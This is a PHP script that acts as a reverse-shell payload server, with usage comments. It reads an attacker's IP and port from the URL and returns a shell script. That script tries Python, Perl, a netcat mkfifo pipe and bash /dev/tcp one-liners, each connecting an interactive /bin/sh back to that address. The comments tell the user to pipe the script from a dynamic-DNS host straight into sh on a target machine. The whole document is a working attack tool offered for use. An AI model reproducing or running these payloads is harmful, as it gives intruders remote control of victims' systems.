<?php header('Content-Type: text/plain'); ?>
<?php
	$a = explode(":", explode("/", $_SERVER['REQUEST_URI'])[2]);
	$host = $a[0];
	$port = $a[1];
?>
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://zodius.myddns.me/sh.php/yourip:1337 | sh
if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<?php echo $host;?>",<?php echo $port;?>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="<?php echo $host;?>";$p=<?php echo $port;?>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <?php echo $host;?> <?php echo $port;?> >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/<?php echo $host;?>/<?php echo $port;?> 0>&1
	exit;
fi
